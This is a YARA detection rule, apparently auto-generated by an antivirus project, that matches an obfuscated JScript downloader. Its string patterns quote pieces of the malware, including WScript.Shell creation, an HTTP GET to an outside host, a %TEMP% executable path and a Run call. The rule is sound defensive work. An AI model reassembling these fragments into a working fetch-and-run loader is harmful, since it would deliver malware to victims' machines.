rule sig_20160401_5a7024a70c2e802a6142672e5471d8b8 {
  meta:
    description = "datamaliciousorder - file 20160401_5a7024a70c2e802a6142672e5471d8b8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b17cbe0b068382ab002bb8d01ae15741b3d700cdb0c7cc9d777298b41bcbc83d"

  strings:
    $s1  = "var WtKce = function TcUo() {return WScript[VxaBzr](\"WScript\"+\".Shell\");}(), TrwWz = 11;" fullword ascii
    $s2  = "function BgeGw(MleYsx, GxJd){QbNp = QbNp * 1; return MleYsx - GxJd;};" fullword ascii
    $s3  = "if (GfWy[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "GfWy[OdmHtu](\"G\" + \"ET\", \"http://asengineeringworks.in/n9wqo\", false);" fullword ascii
    $s5  = "function YqrKn() {return WtKce[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"j4QJIm26bFh.ex\" + \"e\";};" fullword ascii
    $s6  = "function LtdOe(){return JhNv + \"\";};" fullword ascii
    $s7  = "function WraGz() {return ((RzSjn == true) && (RzSjn == RlcKmy)) ? 1 : QbNp;};" fullword ascii
    $s8  = "var IzZcp = new this[\"Date\"]();" fullword ascii
    $s9  = "var YkhXkv = false;" fullword ascii
    $s10 = "RlcKmy = true; " fullword ascii
    $s11 = "function YnXg(){return VxaBzr;};" fullword ascii
    $s12 = "return BgeGw(PdzTfz, RzyYp);" fullword ascii
    $s13 = "var RlcKmy = false;" fullword ascii
    $s14 = "function XqYws(YlBz){WtKce[\"R\"+\"un\"](YlBz, QbNp, QbNp);};" fullword ascii
    $s15 = "function PgKuy()" fullword ascii
    $s16 = "RzSjn = true; " fullword ascii
    $s17 = "var RzSjn = false;" fullword ascii
    $s18 = "function HeiQjy(PxZm) {var MqSi = (1, 2, 3, 4, 5, PxZm); return MqSi;};" fullword ascii
    $s19 = "}while (GzyHdy);" fullword ascii
    $s20 = "function GuiOo(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}